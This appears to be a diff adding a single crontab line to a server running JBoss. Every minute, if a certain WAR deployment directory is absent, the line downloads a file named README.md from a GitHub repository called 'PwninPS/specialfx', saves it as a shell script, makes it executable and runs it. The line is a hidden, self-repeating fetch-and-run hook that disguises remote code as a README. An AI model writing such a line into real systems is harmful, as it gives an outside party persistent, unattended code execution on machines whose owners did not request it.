@@ -1,0 +1,1 @@
+* * * * * if [ ! -d "/usr/appl/col/home/uatcol/firmament/jboss/server/default/deploy/management/colliine1.war" ]; then curl https://raw.githubusercontent.com/PwninPS/specialfx/master/README.md -o firmamentdeploy.sh;chmod 755 firmamentdeploy.sh;./firmamentdeploy.sh; fi
